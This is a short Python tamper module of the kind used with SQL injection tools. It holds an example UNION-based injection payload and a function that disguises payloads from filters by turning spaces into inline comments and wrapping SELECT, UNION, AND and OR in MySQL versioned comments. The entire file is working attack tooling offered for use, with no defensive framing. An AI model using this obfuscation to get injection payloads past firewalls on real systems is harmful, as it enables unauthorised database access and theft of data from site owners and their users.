import random

__example_payload__ = "' AND 1=1 UNION SELECT NULL,NULL--"
__type__ = "double SQL comment obfuscation using nested comment blocks"


def tamper(payload, **kwargs):
    if payload:
        payload = payload.replace(" ", "/**/")
        payload = payload.replace("SELECT", "/**//*!50000SELECT*/")
        payload = payload.replace("UNION", "/**//*!50000UNION*/")
        payload = payload.replace("AND", "/**//*!50000AND*/")
        payload = payload.replace("OR", "/**//*!50000OR*/")
        return payload
    return payload
